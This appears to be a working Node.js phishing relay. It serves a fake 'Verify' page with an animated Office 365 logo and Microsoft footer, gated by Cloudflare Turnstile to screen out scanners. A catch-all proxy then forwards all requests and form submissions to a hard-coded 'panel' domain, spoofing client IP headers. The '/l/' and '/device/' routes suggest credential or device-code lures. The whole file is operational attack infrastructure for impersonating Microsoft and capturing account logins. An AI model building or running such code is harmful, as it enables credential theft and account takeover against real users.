const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const port = process.env.PORT || 3000;

// ⚠️ YOUR PANEL DOMAIN (change if different)
const PANEL_DOMAIN = 'portal42-343.sbs';

// ⚠️ YOUR TURNSTILE SITE KEY (the one that works)
const TURNSTILE_SITEKEY = '0x4AAAAAAD1A5eW6o0hhUZQm';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// ---------- CAPTCHA PAGE (with animated Office 365 logo) ----------
app.get('/captcha', (req, res) => {
    // Clean the return path: remove double slashes
    let returnPath = req.query.return || '/';
    if (returnPath.startsWith('//')) {
        returnPath = returnPath.replace(/^\/+/, '/');
    }
    if (!returnPath.startsWith('/')) {
        returnPath = '/' + returnPath;
    }

    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: #f5f5f5;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
    }
    .error { color: #d32f2f; padding: 10px; background: #ffebee; border-radius: 4px; display: none; margin-bottom: 15px; }
    #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
    :root {
      --s: 180px; --envW: 130px; --envH: 71px; --calW: 118px; --sqW: calc(var(--calW)/3); --sqH: 37px;
      --calHH: 20px; --calH: calc(var(--sqH)*3 + var(--calHH)); --calY: calc(var(--calH) + 20px);
      --calYExt: calc(var(--calH) - 80px); --calYOverExt: calc(var(--calH) - 92px);
      --flapS: 96px; --dur: 5s;
    }
    #subcontainer { width: var(--s); height: var(--s); animation: bounce var(--dur) infinite; }
    @keyframes bounce { 0%,100%,12.5%,32.5%,76.1% { transform: translateY(0); } 22.5%,86% { transform: translateY(7px); } }
    #logo { height: 179px; width: 130px; overflow: hidden; margin-top: -59px; margin-left: 79px; }
    #containerShadow { position: relative; top: 120px; left: 79px; width: var(--envW); height: var(--envH); border-radius: 0 0 7px 7px; box-shadow: rgba(0,0,0,.25) 0 4px 5px; animation: shadow-fade var(--dur) infinite; }
    @keyframes shadow-fade { 0%,100%,21.2%,80% { opacity:0; } 47%,70% { opacity:1; } }
    #flapContainer { width: var(--envW); margin-top: 179px; }
    #ef { width: var(--envW); height: var(--envH); border-radius: 0 0 7px 7px; overflow: hidden; margin-top: -41px; }
    #ef>.l { width: 287px; height: var(--envH); background: #28a8ea; transform: translate(-153px,-70px) rotate(28deg); }
    #ef>.r { width: 287px; height: var(--envH); background: #1490df; transform: translate(-120px,63px) rotate(-28deg); }
    #eb { width: var(--envW); height: 40px; background: #123b6d; margin-top: -70px; }
    #cal { display: flex; flex-wrap: wrap; width: var(--calW); height: var(--calH); border-radius: 7px; overflow: hidden; margin: 0 auto; margin-top: -306px; animation: cal-bounce var(--dur) infinite; transform: translateY(var(--calYExt)) scaleY(1); }
    @keyframes cal-bounce { 0%,100%,16.5%,76.1% { transform: translateY(var(--calY)) scaleY(1); } 28% { transform: translateY(var(--calYOverExt)) scaleY(1); } 31% { transform: translateY(var(--calYExt)) scaleY(1.05); } 33% { transform: translateY(var(--calYExt)) scaleY(.96); } 34%,68.5% { transform: translateY(var(--calYExt)) scaleY(1); } 68.5% { animation-timing-function: cubic-bezier(0.66,-0.16,1,-0.29); } }
    #cal>.t { width: var(--calW); height: calc(var(--calHH)+1px); margin-bottom: -1px; background: #0358a7; }
    #cal>.r { display: flex; width: var(--calW); height: var(--sqH); }
    .s { width: var(--sqW); height: calc(var(--sqH)+1px); }
    .s1 { background: #0078d4; } .s2 { background: #28a8ea; } .s3 { background: #50d9ff; } .s4 { background: #0364b8; } .s5 { background: #14447d; }
    #openedFlap { width: var(--envW); height: 107px; animation: opened-flap-swing var(--dur) infinite; transform-origin: top; transform: translateY(-68px) rotate3d(1,0,0,-180deg); }
    @keyframes opened-flap-swing { 0%,100%,14.5%,76% { transform: translateY(-68px) rotate3d(1,0,0,-90deg); } 16.5%,74% { transform: translateY(-68px) rotate3d(1,0,0,-180deg); } }
    #closedFlap { width: var(--envW); animation: closed-flap-swing var(--dur) infinite; transform-origin: top; transform: translateY(calc(-1*var(--envH))) rotate3d(1,0,0,90deg); }
    @keyframes closed-flap-swing { 0%,100%,77%,8.5% { transform: translateY(calc(-1*var(--envH))) rotate3d(1,0,0,0); } 14.5%,76% { transform: translateY(calc(-1*var(--envH))) rotate3d(1,0,0,90deg); } }
    #fmask { width: var(--envW); height: 107px; overflow: hidden; }
    .flapTriangle { width: 96px; height: 96px; background: #50d9ff; margin: -48px auto 0 auto; border-radius: 7px; transform: scaleY(.6) rotate(45deg); }
    #openedFlap .flapTriangle { background: #123b6d; }
    #closedFlap .flapTriangle { background: #50d9ff; }
    #dp { margin-top: 20px; color: #5e5e5e; font-size: 15px; }
    .footer { font-size: 12px; color: #6c6c6c; margin-top: 30px; border-top: 1px solid #e1e1e1; padding-top: 20px; }
  </style>
</head>
<body>
  <div class="container">
    <div id="loadingLogo">
      <div id=subcontainer>
        <div id=containerShadow></div>
        <div id=logo>
          <div id=flapContainer>
            <div id=openedFlap><div id=fmask><div class=flapTriangle></div></div></div>
            <div id=cal>
              <div class=t></div>
              <div class=r><div class="s s1"></div><div class="s s2"></div><div class="s s3"></div></div>
              <div class=r><div class="s s4"></div><div class="s s1"></div><div class="s s2"></div></div>
              <div class=r><div class="s s5"></div><div class="s s4"></div><div class="s s1"></div></div>
            </div>
          </div>
          <div id=eb></div>
          <div id=ef><div class=r></div><div class=l></div></div>
          <div id=closedFlap><div id=fmask><div class=flapTriangle></div></div></div>
        </div>
      </div>
    </div>
    <div id="dp"></div>
    <div id="status" class="error"></div>
    <div id="cf-turnstile"></div>
    <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
  </div>
  <script>
    const returnPath = "${returnPath}";
    const messages = ["Loading...", "Processing request...", "Almost there...", "Finalizing..."];
    let index = 0;
    function cycleMessages() {
      document.getElementById("dp").textContent = messages[index];
      index = (index + 1) % messages.length;
    }
    cycleMessages();
    setInterval(cycleMessages, 3000);

    function turnstileCallback(token) {
      if (token) {
        window.location.href = returnPath;
      }
    }

    function turnstileErrorCallback() {
      document.getElementById("status").textContent = "Verification error. Please refresh.";
      document.getElementById("status").style.display = "block";
      setTimeout(() => { window.location.reload(); }, 2000);
    }

    function turnstileExpiredCallback() {
      if (window.turnstile) { turnstile.reset(); }
    }

    function onTurnstileLoad() {
      turnstile.render("#cf-turnstile", {
        sitekey: "${TURNSTILE_SITEKEY}",
        theme: "light",
        callback: turnstileCallback,
        "error-callback": turnstileErrorCallback,
        "expired-callback": turnstileExpiredCallback,
      });
    }
  </script>
</body>
</html>
    `);
});

// ---------- CAPTCHA MIDDLEWARE (currently BYPASSED for testing) ----------
// Uncomment these lines to enable CAPTCHA protection
/*
app.use('/l/*', (req, res) => {
    const originalUrl = req.originalUrl;
    const cleanPath = originalUrl.replace(/^\/+/, '/');
    res.redirect(`/captcha?return=${encodeURIComponent(cleanPath)}`);
});

app.use('/device/*', (req, res) => {
    const originalUrl = req.originalUrl;
    const cleanPath = originalUrl.replace(/^\/+/, '/');
    res.redirect(`/captcha?return=${encodeURIComponent(cleanPath)}`);
});
*/

// ✅ BYPASS: For testing, pass through without CAPTCHA
app.use('/l/*', (req, res, next) => next());
app.use('/device/*', (req, res, next) => next());

// ---------- MAIN PROXY (fetches content from your panel) ----------
app.use('*', async (req, res) => {
    try {
        // Build the target URL
        const targetUrl = new URL(req.originalUrl, `https://${PANEL_DOMAIN}`);
        
        // Prepare headers
        const headers = new Headers(req.headers);
        headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        headers.delete('host');

        // Forward real client IP to help with Cloudflare
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        if (clientIp) {
            headers.set('X-Forwarded-For', clientIp);
            headers.set('CF-Connecting-IP', clientIp);
        }

        // Add extra headers that Cloudflare expects
        headers.set('Accept-Language', 'en-US,en;q=0.9');
        headers.set('Accept-Encoding', 'gzip, deflate, br');
        headers.set('Cache-Control', 'no-cache');

        const opts = {
            method: req.method,
            headers: headers,
        };
        if (req.method !== 'GET' && req.method !== 'HEAD') {
            opts.body = req.body;
        }

        // Fetch from your panel
        const response = await fetch(targetUrl.toString(), opts);
        const body = await response.text();
        const contentType = response.headers.get('content-type') || '';

        // Log the response status for debugging (will appear in Render logs)
        console.log(`Proxy: ${req.originalUrl} -> ${targetUrl.toString()} status: ${response.status}`);

        // Send the response back to the user
        res.status(response.status).set('Content-Type', contentType).send(body);
    } catch (e) {
        console.error('Proxy error:', e);
        res.status(500).send('Proxy Error: ' + e.message);
    }
});

app.listen(port, () => {
    console.log(`✅ Proxy running on port ${port}`);
});
